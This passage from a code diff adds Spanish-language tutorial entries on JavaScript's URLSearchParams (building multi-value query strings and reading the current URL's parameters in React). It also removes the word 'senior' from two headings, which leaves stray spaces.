+      "value": "const params = new URLSearchParams();\n\nconst colores = ['rojo', 'azul', 'verde'];\n\n// Convención 1: Repetir claves (Soportado por muchos frameworks backend)\ncolores.forEach(c => params.append('color', c));\nconsole.log(params.toString()); \n// \"color=rojo&color=azul&color=verde\"\n\n// Convención 2: Comas (Requiere manipulación manual)\nparams.set('tags', colores.join(','));\nconsole.log(params.toString());\n// \"tags=rojo,azul,verde\""
+    },
+    {
+      "type": "text",
+      "value": "Además de para construir peticiones, `URLSearchParams` es vital para **leer** parámetros de la URL actual del navegador. Esto es esencial en React para mantener el estado de la UI sincronizado con la URL (ej: compartir un link de una búsqueda)."
+    },
+    {
+      "type": "text",
+      "value": "En JavaScript puro, leemos la URL actual mediante `window.location.search`."
+    },
+    {
+      "type": "code",
+      "value": "// Imagina que la URL es: misitio.com/buscar?q=react&orden=nuevo\n\nconst params = new URLSearchParams(window.location.search);\n\n// Lectura de valores\nconst termino = params.get('q'); // \"react\"\nconst orden = params.get('orden'); // \"nuevo\"\nconst pagina = params.get('pagina'); // null (no existe)\n\n// Comprobación de existencia\nif (params.has('q')) {\n  console.log('El usuario está buscando algo');\n}"
     }
   ]
 },
@@ -1138,7 +1623,7 @@ const KNOWLEDGE_BASE: Concept[] = [
     },
     {
       "type": "text",
-      "value": "Aquí tienes cómo implementaría esto un desarrollador senior, utilizando actualizaciones funcionales y gestión limpia de eventos."
+      "value": "Aquí tienes cómo implementaría esto un desarrollador , utilizando actualizaciones funcionales y gestión limpia de eventos."
     },
     {
       "type": "code",
@@ -1418,7 +1903,7 @@ const KNOWLEDGE_BASE: Concept[] = [
     },
     {
       "type": "text",
-      "value": "### Solución del Senior Developer"
+      "value": "### Solución del  Developer"
     },
     {
       "type": "text",
